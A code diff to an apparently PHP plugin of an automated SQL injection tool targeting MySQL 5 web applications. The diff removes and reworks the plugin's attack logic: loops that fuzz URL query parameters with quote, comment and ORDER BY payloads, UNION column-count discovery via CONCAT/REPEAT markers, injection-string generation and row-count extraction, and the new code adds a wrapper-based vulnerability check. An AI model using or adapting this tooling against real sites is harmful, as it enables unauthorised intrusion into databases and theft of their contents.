@@ -6,261 +6,34 @@
 
 			const		PLUGIN_NAME						= "MySQL5 Standard Plugin by Juan Stange";
 
-			private	$_affectedField				=	NULL;
-			private	$_maxFields						=	NULL;
-			private	$_table							=	NULL;
-			private	$_totalRegisters				=	0;				//Total registers found by count(*)
-			private	$_step							=	10;			//step LIMIT _currentRegisterStep,_currentRegisterStep+_step
-			private	$_currentRegisterStep		=	0;
-			private	$_fields							=	NULL;			//table fields
 			private	$_groupConcatLength			=	1024;			//Default group concat character length
-			private	$_openTag						=	NULL;
-			private	$_closeTag						=	NULL;
-			private	$_fieldPayloads				=	array("","'", "%'","')","%')");
-			private	$_endingPayloads				=	array("ORDER BY 1 DESC");
-			private	$_commentPayloads				=	array("/*","--","#");
-			private	$_currFieldPayload			=	NULL;
-			private	$_currTerminatingPayload	=	NULL;
 			private	$_affectedDatabases			=	array("mysql5");
-			private	$_getCompleteSchema			=	TRUE;
-			private	$_version						=	NULL;
 			private	$_strRepeat						=	100;
 			private	$_repeatCharacter				=	"a";
+
+			public function isVulnerable(){
+
+				$parser	=	new \aidSQL\parser\Generic();
+				$parser->setLog($this->_logger);
+				$parser->setOpenTag("NULL");
+				$parser->setCloseTag("NULL");
+
+				$this->setParser($parser);
+				$this->setFieldWrapper("CONCAT(0x4e554c4c,%value%,0x4e554c4c)");
+
+				parent::isVulnerable();
+
+			}
 
 			public function getPluginName(){
 				return self::PLUGIN_NAME;
 			}
 
+			public function getInjectionMethods(){
+			}
+
 			public function getAffectedDatabases(){
 				return $this->_affectedDatabases;
-			}
-
-			private function orderRequestVariables(Array $requestVariables){
-
-				$numVariables	=	array();
-				$strVariables	=	array();
-
-				foreach($requestVariables as $name=>$value){
-
-					if(is_numeric($value)){
-						$numVariables[$name]	=	$value;
-					}else{
-						$strVariables[$name]	=	$value;
-					}
-
-				}
-
-				return array("strings"=>$strVariables,"numeric"=>$numVariables);
-
-			}
-
-
-			public function setConfig (Array $config){
-
-				parent::setConfig($config);
-
-				if(isset($config["field-payloads"])){
-
-					$payloads	=	explode("_",$config["field-payloads"]);
-					$this->setFieldPayloads($payloads);
-
-				}
-
-				if(isset($config["ending-payloads"])){
-
-					$payloads	=	explode("_",$config["ending-payloads"]);
-					$this->setEndingPayloads($payloads);
-
-				}
-
-				if(isset($config["comment-payloads"])){
-
-					$payloads	=	explode("_",$config["comment-payloads"]);
-					$this->setCommentPayloads($payloads);
-
-				}
-
-				if(isset($config["injection-attempts"])){
-
-					$this->setInjectionAttempts($config["injection-attempts"]);
-
-				}
-
-			}
-
-
-			public function setEndingPayloads(Array $payloads){
-
-				$this->_endingPayloads	=	$payloads;
-
-			}
-
-
-			public function setCommentPayloads(Array $payloads){
-
-				$this->_commentPayloads	=	$payloads;
-
-			}
-
-
-			/**
-			*Checkout if the given URL by the HttpAdapter is vulnerable or not
-			*This method combines execution
-			*/
-
-			public function isVulnerable(){
-
-				$url			=	$this->_httpAdapter->getUrl();
-				$vars			=	$url->getQueryAsArray();
-				$vars			=	$this->orderRequestVariables($vars);
-				$found		=	FALSE;
-
-				$keys	=	array_keys($this->_config);
-
-				if(in_array("numeric-only",$keys)){
-
-					$vars	=	$vars["numeric"];
-
-				}elseif(in_array("strings-only",$keys)){
-
-					$vars	=	$vars["strings"];
-
-				}else{	//Default, use both
-
-					$vars	=	array_merge($vars["numeric"],$vars["strings"]);
-
-				}
-
-				//Start offset, use it when you know the amount of fields involved in the union injection
-
-				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;
-
-				if(!$offset){
-					throw(new \Exception("Start offset should be an integer greater than 0!"));
-				}
-
-				$varCount	=	0;
-				$maxVars		=	(isset($this->_config["var-count"]))	?	(int)$this->_config["var-count"] : NULL;
-
-				foreach($vars as $variable=>$value){
-
-					if(!is_null($maxVars)&&$varCount++ > $maxVars){
-						die("BREAK, LOL");
-						break;
-					}
-
-					$this->setAffectedVariable($variable,$value);
-
-					for($i=$offset;$i<=$this->_injectionAttempts;$i++){
-
-						$this->setMaxFields($i);
-
-						$this->log("[$variable] Attempt:\t$i",0,"light_cyan");
-
-						foreach($this->_commentPayloads as $commentPayload){
-
-							$this->log("Comment Payload:\t$commentPayload",0,"light_cyan");
-
-							$this->setQueryCommentOpen($commentPayload);
-				
-							foreach($this->_endingPayloads as $terminatingPayload){
-
-								$this->log("Ending Payload:\t$terminatingPayload",0,"light_cyan");
-
-								$this->_currTerminatingPayload = $terminatingPayload;
-
-								$injection	=	$this->makeDiscoveryInjection();
-
-								foreach($this->_fieldPayloads as $FPL){
-
-									$this->log("Field Payload:\t$FPL",0,"light_cyan");
-
-									$this->_currFieldPayload	=	$FPL;
-
-									$matches	=	$this->analyzeInjection($injection);
-
-									$code		=	$this->_httpAdapter->getHttpCode();
-									$color	=	($code==200)	?	"light_cyan"	:	"yellow";
-									$status	=	($code==200)	?	0	:	2;
-							
-									$this->log("HTTP ".$this->_httpAdapter->getHttpCode(),$status,$color);
-
-									if(isset($matches[0])){
-
-										$this->_isVulnerable	=	TRUE;
-
-										$this->log($this->_httpAdapter->getUrl(),0,"light_green",TRUE);
-										$this->log("FOUND SQL INJECTION!!!",0,"light_green",TRUE);
-										$this->log("Affected Variable\t:\t$variable",0,"light_purple");
-										$this->log("Field Count\t\t:\t$i",0,"light_purple");
-
-										//Actually we can have a series of childNodes here any field is good, so we just pick
-										//a random field.
-	
-										$this->log("Checking database version ... ",0,"green");
-										$this->setAffectedVariable($variable,$value);
-										$this->setMaxFields($i);
-
-										return TRUE;
-
-									}
-
-								}
-
-							}
-
-						}
-
-					}
-
-					$url	=	$this->_httpAdapter->getUrl();
-					$url->addRequestVariable($variable,$value); //restore value if we couldnt find the vulnerable field
-					$this->_httpAdapter->setUrl($url);
-
-				}
-
-				return FALSE;
-
-			}
-
-			private function checkVersion($version){
-
-				if(substr($version,0,1)!=5){
-					return FALSE;
-				}
-
-				return TRUE;
-
-			}
-
-
-			public function getOpenTag(){
-
-				return $this->_openTag	=	"REPEAT(".\String::hexEncode($this->_repeatCharacter).",".$this->_strRepeat.')';
-
-			}
-
-
-			public function getCloseTag(){
-
-				return $this->_closeTag	=	"REPEAT(".\String::hexEncode($this->_repeatCharacter).",".$this->_strRepeat.')';
-
-			}
-
-
-			private function tagConcat($string){
-
-				$pre	= NULL;
-				$post	= NULL;
-
-				$openConcatTag		=	$this->getOpenTag();
-				$closeConcatTag	=	$this->getCloseTag();
-
-				$pre					=	"CONCAT($openConcatTag,";
-				$post					=	",$closeConcatTag)";
-
-				return $pre.$string.$post;
-
 			}
 
 			//GROUP_CONCAT is very efficient when you want to have a small footprint, however
@@ -299,67 +72,6 @@
 				}
 
 				$this->_groupConcatLength	=	$length;
-
-			}
-
-
-			public function setStep($step=10){
-
-				$step = (int)$step;
-
-				if(!$step){
-					throw (new \Exception("Step should be an integer greater than 0"));
-				}
-
-				$this->_step = $step;
-
-			}
-
-			public function setFieldPayloads(Array $payloads){
-
-				$this->_fieldPayloads	=	$payloads;
-
-			}
-
-			public function getFieldPayloads(){
-
-				return $this->_fieldPayloads;
-
-			}
-
-			public function setFields(Array $fields){
-
-				$this->_fields = $fields;
-
-			}
-
-			/**
-			 *	Returns an SQL injection string for the next sequence of registers
-			 *
-			 * @param Array $fields If not provided all fields will be used by default
-			 * @return String SQL injection string for the next set of registers
-			 * @return boolean FALSE No registers left
-			 *
-			 */
-
-			public function getNext($fields=array()){
-
-				//@TODO
-
-			}
-
-			/**
-			*Sets the affected field to inject further commands
-			*@param int $affectedField
-			*/
-
-			public function setAffectedField($affectedField=NULL){
-
-				if(empty($affectedField)){
-					throw (new \Exception("The affected field cant be empty"));
-				}
-
-				$this->_affectedField = $affectedField;
 
 			}
 
@@ -589,68 +301,7 @@
 
 			}
 
-			public function count(){
 
-				if(!isset($this->_table)){
-					throw(new \Exception("Cannot get register count from unespecified table, use setTable first"));
-				}
-
-				$select	= "COUNT(*)";
-				$from		= "FROM ".$this->_table;
-				return $this->execute($select,$from);
-
-			}
-
-
-			public function makeDiscoveryInjection(){
-
-				$discover = array();
-
-				for($i=1;$i<=$this->_maxFields;$i++){
-
-					$discover[]= $this->tagConcat($i);
-
-				}
-
-				return implode($discover,",");
-
-			}
-
-			/**
-			 *	Basic method which generates Injection strings based on the affected field and the max amount
-			 * of fields available, this method is private and should only be used in this class
-			 * @param String $select Paylod for the select field (The affected field)
-			 * @param String $from Payload for the FROM condition
-			 * @return String, sql injection string
-			 */
-
-			private function generateInjection($select,$from=NULL,$concat=TRUE){
-
-				$fields=array();
-
-				if(!isset($this->_maxFields)){
-
-					throw (new \Exception("Cant generate injection with no field count!"));
-
-				}
-
-				for($i=1;$i<=$this->_maxFields;$i++){
-
-					$fields[]=$this->tagConcat($select);
-
-				}
-
-				$fields = implode($fields,",");
-
-				if(!empty($from)){
-
-					$fields.=" $from";
-
-				}
-
-				return $fields;
-
-			}
 
 			/**
 			*Combines URL execution with parsing
@@ -897,6 +548,13 @@
 
 
 				return FALSE;
+
+			}
+
+
+			public function setConfig (Array $config){
+
+				parent::setConfig($config);
 
 			}
 
